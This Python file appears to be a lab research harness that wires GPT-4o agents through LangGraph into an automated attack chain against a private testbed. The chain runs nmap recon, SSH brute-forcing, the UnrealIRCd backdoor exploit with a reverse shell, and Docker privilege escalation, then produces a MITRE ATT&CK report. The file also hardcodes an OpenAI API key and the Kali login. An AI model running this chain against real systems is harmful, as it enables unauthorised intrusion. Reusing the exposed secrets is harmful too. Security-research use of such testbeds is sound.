import os
import sys

import paramiko
import time
from typing import TypedDict, Annotated, List
import operator
from langchain_openai import ChatOpenAI
from langchain_core.tools import tool
from langchain_core.messages import BaseMessage, HumanMessage
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from datetime import datetime
import json
from pathlib import Path

# metadata settings
KALI_IP = "192.168.34.4"
KALI_USER = "kali"
KALI_PASS = "kali"
REMOTE_WORK_DIR = "~/CREMEv2/CREME_backend_execution/scripts/02_scenario"
REMOTE_ENV = "~/.venvs/redteamingenv/bin/activate"
LOG_FOLDER_NAME = "creme_logs"

# LLM setup
os.environ["OPENAI_API_KEY"] = "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"

"""
Tool definition
"""
@tool
def tool_recon_scan(target_ip: str):
    """
    Sccan the target_ip using nmap.
    Use this tool if you need to recon, scan or check available ports of the target_ip.
    :param target_ip: The target ip to run nmap on. e.g. 192.168.34.3
    :return: The nmap scan result
    """
    print(f"\n[nmap Tool] tool_recon_scan: {target_ip}")
    print(f"[nmap Tool] Connecting to  Kali ({KALI_IP})...")

    command = (
        f"source {REMOTE_ENV} && "
        f"cd {REMOTE_WORK_DIR} && "
        f"python3 03_ransomware/python_files/attacker_server/01_step_Ransomware.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # connect to kali
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS)
        print("[nmap Tool] Connection success")
        print(f"[nmap Tool] Running Command {command}")

        # execute command
        stdin, stdout, stderr = ssh.exec_command(command)

        # read output
        exit_status = stdout.channel.recv_exit_status()
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()

        if exit_status == 0:
            print(f"[nmap Tool] nmap scan successful")
            return f"Nmap Scan Completed Successfully.\nOutput:\n{output}"
        else:
            print(f"[nmap Tool] nmap scan failed。Exit Code: {exit_status}")
            return f"Error executing scan script.\nSTDERR: {error}\nSTDOUT: {output}"

    except Exception as e:
        return f"SSH Connection Failed: {e}"
    finally:
        ssh.close()

@tool
def run_ssh_bruteforce(target_ip : str):
    """
    Runs bruteforce ssh password cracking on target_ip.
    Use this tool if you need the credentials of the ssh connection or other entry possibilities.
    :param target_ip: The target ip to run ssh bruteforce on. e.g. 192.168.34.3
    :return: The result of the ssh bruteforce password cracking attack
    """
    print(f"\n[Tool] run_ssh_bruteforce: {target_ip}")
    print(f"[Tool] Connecting to  Kali ({KALI_IP})...")

    command = (
        f"source {REMOTE_ENV} && "
        f"cd {REMOTE_WORK_DIR} && "
        f"python3 03_ransomware/python_files/attacker_server/test.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        print("[ssh_bruteforce Tool] Connection success")
        print(f"[ssh_bruteforce Tool] Running Command {command}")

        stdin, stdout, stderr = ssh.exec_command(command)

        output_buffer = []

        for line in iter(stdout.readline, ""):
            print(line, end="")
            sys.stdout.flush()
            output_buffer.append(line)

        err_output = stderr.read().decode()
        if err_output:
            print(f"\n[Remote STDERR]:\n{err_output}")

        exit_status = stdout.channel.recv_exit_status()

        if exit_status == 0:
            print(f"[ssh_bruteforce Tool] SSH Bruteforce Complete (Exit Code: 0)")
            return f"SSH Bruteforce Attack Successful!\nResults:\n{''.join(output_buffer)}"
        else:
            print(f"[ssh_bruteforce Tool] SSH Bruteforce Failed (Exit Code: {exit_status})")
            return f"SSH Bruteforce Attack Failed (Exit Code: {exit_status})\nOutput:\n{''.join(output_buffer)}\nError:\n{err_output}"

    except paramiko.AuthenticationException:
        print("[ssh_bruteforce Tool] SSH connection Failed.")
        return "SSH Bruteforce Failed: SSH Authentication to Kali failed"
    except paramiko.SSHException as e:
        print(f"[ssh_bruteforce Tool] SSH connection Failed: {e}")
        return f"SSH Bruteforce Failed: SSH Error - {e}"
    except Exception as e:
        print(f"[ssh_bruteforce Tool] Unexpected Error: {e}")
        return f"SSH Bruteforce Failed: Unexpected Error - {e}"
    finally:
        ssh.close()

@tool
def tool_exploitation(target_ip: str):
    """
    Exploits the UnrealIRCd 3.2.8.1 backdoor to gain initial access to the target.

    This tool triggers the Metasploit module 'exploit/unix/irc/unreal_ircd_3281_backdoor'.
    It is used when reconnaissance identifies a vulnerable UnrealIRCd service on port 6697.
    Upon success, it establishes a reverse shell (Session 1).

    :param target_ip: The IP address of the target machine (e.g., '192.168.34.101').
    :return: The output of the exploit execution, ideally containing the new Session ID.
    """
    print(f"\n[UnrealIRCd 3.2.8.1 backdoor Tool] tool_exploitation: {target_ip}")
    print(f"[UnrealIRCd 3.2.8.1 backdoor Tool] Connecting to  Kali ({KALI_IP})...")

    command = (
        f"source {REMOTE_ENV} && "
        f"cd {REMOTE_WORK_DIR} && "
        f"python3 03_ransomware/python_files/attacker_server/test3.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        print("[UnrealIRCd 3.2.8.1 backdoor Tool] Connection success")
        print(f"[UnrealIRCd 3.2.8.1 backdoor Tool] Running Command: {command}")

        stdin, stdout, stderr = ssh.exec_command(command)

        output_buffer = []
        # Real-time streaming output
        for line in iter(stdout.readline, ""):
            print(line, end="")
            sys.stdout.flush()
            output_buffer.append(line)

        err_output = stderr.read().decode()
        if err_output:
            print(f"\n[Remote STDERR]:\n{err_output}")

        exit_status = stdout.channel.recv_exit_status()
        full_log = "".join(output_buffer)

        if exit_status == 0:
            print(f"[UnrealIRCd 3.2.8.1 backdoor Tool] Exploitation Successful (Exit Code: 0)")
            return f"Exploitation Succeeded.\nOutput:\n{full_log}"
        else:
            print(f"[UnrealIRCd 3.2.8.1 backdoor Tool] Exploitation Failed (Exit Code: {exit_status})")
            return f"Exploitation Failed.\nSTDERR: {err_output}\nSTDOUT: {full_log}"

    except Exception as e:
        return f"SSH Connection Failed: {e}"
    finally:
        ssh.close()

@tool
def run_privilege_escalation(target_ip: str, session_id: int):
    """
    Performs privilege escalation on the target machine to gain Root access.

    Use this tool ONLY after you have successfully established an initial session
    (e.g., via tool_initial_access or run_ssh_bruteforce).
    It utilizes the 'linux/local/docker_daemon_privilege_escalation' exploit.

    :param target_ip: The IP address of the target (e.g., '192.168.34.101').
    :param session_id: The ID of the existing low-privilege session (e.g., 1).
                       This is required to execute the local exploit.
    :return: A string indicating success/failure and the NEW root session ID (e.g., "Success. New Root Session: 2").
    """
    print(f"\n[docker_daemon_privilege_escalation Tool] tool_exploitation: {target_ip}")
    print(f"[docker_daemon_privilege_escalation Tool] Connecting to  Kali ({KALI_IP})...")

    command = (
        f"source {REMOTE_ENV} && "
        f"cd {REMOTE_WORK_DIR} && "
        f"python3 03_ransomware/python_files/attacker_server/test4.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip} {session_id}"
    )

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        print("[docker_daemon_privilege_escalation Tool] Connection success")
        print(f"[docker_daemon_privilege_escalation Tool] Running Command: {command}")

        stdin, stdout, stderr = ssh.exec_command(command)

        output_buffer = []
        # Real-time streaming output
        for line in iter(stdout.readline, ""):
            print(line, end="")
            sys.stdout.flush()
            output_buffer.append(line)

        err_output = stderr.read().decode()
        if err_output:
            print(f"\n[Remote STDERR]:\n{err_output}")

        exit_status = stdout.channel.recv_exit_status()
        full_log = "".join(output_buffer)

        if exit_status == 0:
            print(f"[docker_daemon_privilege_escalation Tool] Privilege Escalation Successful (Exit Code: 0)")
            return f"Privilege Escalation Succeeded.\nOutput:\n{full_log}"
        else:
            print(f"[docker_daemon_privilege_escalation Tool] Privilege Escalation Failed (Exit Code: {exit_status})")
            return f"Privilege Escalation Failed.\nSTDERR: {err_output}\nSTDOUT: {full_log}"

    except Exception as e:
        return f"SSH Connection Failed: {e}"
    finally:
        ssh.close()

recon_tools = [tool_recon_scan]
initial_access_tools = [run_ssh_bruteforce]
execution_tools = [tool_exploitation]
privilege_escalation_tools = [run_privilege_escalation]

"""
Static node and state definitions
"""
class AgentState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    current_step: str

def recon_agent_node(state: AgentState):
    messages = state['messages']
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(recon_tools)
    response = model.invoke(messages)
    return {"messages": [response], "current_step": "recon"}

def initial_access_agent_node(state: AgentState):
    messages = state['messages']
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(initial_access_tools)
    response = model.invoke(messages)
    return {"messages": [response], "current_step": "initial_access"}

def execution_agent_node(state: AgentState):
    messages = state['messages']
    # Bind the specific tools for Step 3
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(execution_tools)
    response = model.invoke(messages)
    return {"messages": [response], "current_step": "execution"}

def privilege_escalation_agent_node(state: AgentState):
    messages = state['messages']
    # Bind the specific tools for Step 4
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(privilege_escalation_tools)
    response = model.invoke(messages)
    return {"messages": [response], "current_step": "privilege_escalation"}

recon_tool_node = ToolNode(recon_tools)
initial_access_tool_node = ToolNode(initial_access_tools)
execution_tool_node = ToolNode(execution_tools)
privilege_escalation_tool_node = ToolNode(privilege_escalation_tools)


def evaluator_agent_node(state: AgentState):
    """
    Single-stage evaluator: Takes all execution outputs and generates
    comprehensive pentest report with LLM-based analysis
    """
    messages = state['messages']

    # Extract target IP from conversation
    target_ip = "192.168.34.3"
    for msg in messages:
        if isinstance(msg.content, str) and "192.168" in msg.content:
            parts = msg.content.split()
            for part in parts:
                if part.startswith("192.168"):
                    target_ip = part
                    break

    # Build comprehensive context from all message outputs
    execution_log = "\n".join([
        f"[{i}] {msg.content[:1000]}"
        for i, msg in enumerate(messages[-30:], 1)  # Last 30 messages for full context
    ])

    # Create evaluation prompt with all raw outputs
    prompt_file = Path(__file__).parent / "evaluation_prompt_template.txt"
    evaluation_prompt = prompt_file.read_text()
    model = ChatOpenAI(model="gpt-4o", temperature=0.3)
    response = model.invoke(messages + [HumanMessage(content=evaluation_prompt)])

    # Print report to console
    print("\n" + "=" * 80)
    print("PENETRATION TEST REPORT - MITRE ATT&CK FRAMEWORK ASSESSMENT")
    print("=" * 80)
    print(response.content)
    print("=" * 80)

    # Save report to file
    report_dir = Path(LOG_FOLDER_NAME) / "pentest_reports"
    report_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"pentest_report_{target_ip}_{timestamp}.txt"
    filepath = report_dir / filename

    with open(filepath, 'w') as f:
        f.write("PENETRATION TEST REPORT - MITRE ATT&CK FRAMEWORK ASSESSMENT\n")
        f.write("=" * 80 + "\n")
        f.write(f"Target IP: {target_ip}\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")
        f.write(response.content)

    print(f"\n[✓ Report saved to: {filepath}]")

    return {
        "messages": [response],
        "current_step": "evaluator"
    }

"""
Graph Construction
"""
workflow = StateGraph(AgentState)

# Add nodes
workflow.add_node("recon_agent", recon_agent_node)
workflow.add_node("initial_access_agent", initial_access_agent_node)
workflow.add_node("execution_agent", execution_agent_node)
workflow.add_node("privilege_escalation_agent", privilege_escalation_agent_node)
workflow.add_node("evaluator_agent", evaluator_agent_node)

workflow.add_node("recon_tools", recon_tool_node)
workflow.add_node("initial_access_tools", initial_access_tool_node)
workflow.add_node("execution_tools", execution_tool_node)
workflow.add_node("privilege_escalation_tools", privilege_escalation_tool_node)

workflow.set_entry_point("recon_agent")

def should_continue_recon(state: AgentState):
    last_message = state["messages"][-1]
    if last_message.tool_calls:
        return "recon_tools"
    return "initial_access_agent"

workflow.add_conditional_edges("recon_agent", should_continue_recon)
workflow.add_edge("recon_tools", "recon_agent")

def should_continue_initial_access(state: AgentState):
    last_message = state["messages"][-1]
    if last_message.tool_calls:
        return "initial_access_tools"
    return "execution_agent"

workflow.add_conditional_edges("initial_access_agent", should_continue_initial_access)
workflow.add_edge("initial_access_tools", "initial_access_agent")

def should_continue_execution(state: AgentState):
    last_message = state["messages"][-1]
    if last_message.tool_calls:
        return "execution_tools"
    return "privilege_escalation_agent"

workflow.add_conditional_edges("execution_agent", should_continue_execution)
workflow.add_edge("execution_tools", "execution_agent")

def should_continue_privesc(state: AgentState):
    last_message = state["messages"][-1]
    if last_message.tool_calls:
        return "privilege_escalation_tools"
    return "evaluator_agent"

workflow.add_conditional_edges("privilege_escalation_agent", should_continue_privesc)
workflow.add_edge("privilege_escalation_tools", "privilege_escalation_agent")
workflow.add_edge("evaluator_agent", END)

app = workflow.compile()

if __name__ == "__main__":
    print("=== AI Attack Agent (Recon + Initial Access) ===")

    while True:
        user_input = input("\n[User]: ")
        if user_input.lower() in ["quit", "exit"]:
            break

        initial_state = {"messages": [HumanMessage(content=user_input)], "current_step": "recon"}

        print("\n--- Agent Thinking & Acting ---")
        # log output
        for event in app.stream(initial_state):
            for key, value in event.items():
                if key == "recon_agent":
                    msg = value["messages"][0]
                    if msg.tool_calls:
                        print(f"  [Recon Agent Decision] -> call tool: {msg.tool_calls[0]['name']}")
                    else:
                        print(f"  [Recon Agent Respond]: {msg.content}")
                elif key == "recon_tools":
                    print(f"  [Recon Tool Finished] -> result sent to Recon Agent")
                elif key == "initial_access_agent":
                    msg = value["messages"][0]
                    if msg.tool_calls:
                        print(f"  [Initial Access Agent Decision] -> call tool: {msg.tool_calls[0]['name']}")
                    else:
                        print(f"  [Initial Access Agent Respond]: {msg.content}")
                elif key == "initial_access_tools":
                    print(f"  [Initial Access Tool Finished] -> result sent to Initial Access Agent")
                elif key == "execution_agent":
                    msg = value["messages"][0]
                    if msg.tool_calls:
                        print(f"  [Execution Agent Decision] -> call tool: {msg.tool_calls[0]['name']}")
                    else:
                        print(f"  [Execution Agent Decision]: {msg.content}")
                elif key == "execution_tools":
                    print(f"  [Execution Tool Finished] -> result sent to Initial Access Agent")
                elif key == "privilege_escalation_agent":
                    msg = value["messages"][0]
                    if msg.tool_calls:
                        print(f"  [Privilege Escalation Agent Decision] -> call tool: {msg.tool_calls[0]['name']}")
                    else:
                        print(f"  [Privilege Escalation Agent Respond]: {msg.content}")
                elif key == "privilege_escalation_tools":
                    print(f"  [Privilege Escalation Tool Finished] -> result sent to Initial Access Agent")